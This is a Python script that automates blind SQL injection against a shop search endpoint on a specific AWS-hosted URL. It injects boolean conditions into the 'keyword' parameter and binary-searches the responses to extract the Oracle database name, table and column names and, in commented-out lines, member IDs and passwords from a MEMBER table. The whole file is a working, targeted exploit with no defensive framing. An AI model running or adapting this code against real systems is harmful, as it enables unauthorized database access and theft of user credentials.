import aiohttp
import asyncio

def check(result):
    return result['TOTAL'] == 0

queue = asyncio.Queue()

async def vector(data, para, low, high):

    q = await queue.get()
    async with aiohttp.ClientSession() as session:
        while(low +1 < high):
            mid = (low + high) // 2
            dd = data.copy()
            dd[para] = dd[para] % mid
            async with session.post('http://web-as-alb-1683120559.us-east-2.elb.amazonaws.com/shop/mainSearch.do', data= dd) as resp:
    
                if(not resp.ok):
                    low = mid
                else:
                    high = mid

    await queue.put(q)
    return low

async def get_str(data, para, target):
    dd = data.copy()
    dd[para] = dd[para] + ' \' or length({}) < %d --'.format(target)
    length = await vector(dd, para, 1, 200)
    name = ['*'] * length
    tasks = []

    for i in range(length):
        dd = data.copy()
        dd[para] = dd[para] + ' \' or ascii(substr({}, {}, 1)) < %d --'.format(target, i+1)
        tasks.append(asyncio.create_task(vector(dd, para, 0, 200)))

    for i in range(length):
        name[i] = chr(await tasks[i])

    return ''.join(name)

async def db_name(data, para): # db 이름 알아내기
    name = await get_str(data, para, '(SELECT SYS.DATABASE_NAME FROM DUAL)')
    return name

async def table_names(data, para, db_name): # 테아블 목록 확인
    dd = data.copy()
    dd[para] = dd[para] + ' \' or {} < %d --'.format('(SELECT count(table_name) FROM USER_TABLES)')
    table_num = await vector(dd, para, 1, 100 )
    tasks = []
    for i in range(table_num):
        tasks.append(asyncio.create_task(get_str(data, para, '(select  M.table_name from (SELECT ROWNUM AS rownumber, table_name FROM USER_TABLES) M WHERE M.rownumber = {})'.format(i+1))))
    
    tables = []
    for i in range(table_num):
        tables.append(await tasks[i])
        
    return tables

async def col_names(data, para, db_name, table_name): #칼럼 이름 확인
    dd = data.copy()
    dd[para] = dd[para] + ' \' or {} < %d --'.format('(SELECT count(column_name) FROM  all_tab_columns WHERE table_name = \'{}\')'.format(table_name))
    col_num = await vector(dd, para, 1, 100 )
    temp = 0
    tasks = []
    for i in range(col_num):
        tasks.append(asyncio.create_task(get_str(data, para, '(select  M.column_name from (SELECT ROWNUM AS rownumber, column_name FROM all_tab_columns WHERE table_name = \'{}\' ) M WHERE M.rownumber = {})'.format(table_name, i+1))))

    columns = []
    for i in range(col_num):
        columns.append(await tasks[i])
        
    return columns
async def main():
    for i in range(10):
        await queue.put(1)
    data = {'&PAGE_INDEX':'1','PAGE_ROW':'16','keyword':'aa'}

		# 데이터베이스 이름
    d = await db_name(data, 'keyword')

		# 데이터베이스 내 테이블 목록
    #tables = await table_names(data,'keyword','chmdb')

	  # MEMBER 테이블을 column 목록
    # columns = await col_names(data,'keyword', 'chmdb',  'MEMBER')

		# MEMBER 테이블 2번 행의 ID 와 비밀번호
    # account = await get_str(data, 'keyword', '(SELECT M.MEMBER_ID FROM (SELECT ROWNUM AS rownumber, MEMBER_ID FROM MEMBER) M WHERE M.rownumber = 2)')
    # print(account)
    # passa = await get_str(data, 'keyword', '(SELECT M.MEMBER_PASSWD FROM (SELECT ROWNUM AS rownumber, MEMBER_PASSWD FROM MEMBER) M WHERE M.rownumber = 2)')
    # print(passa)

    temp = 0

asyncio.run(main())
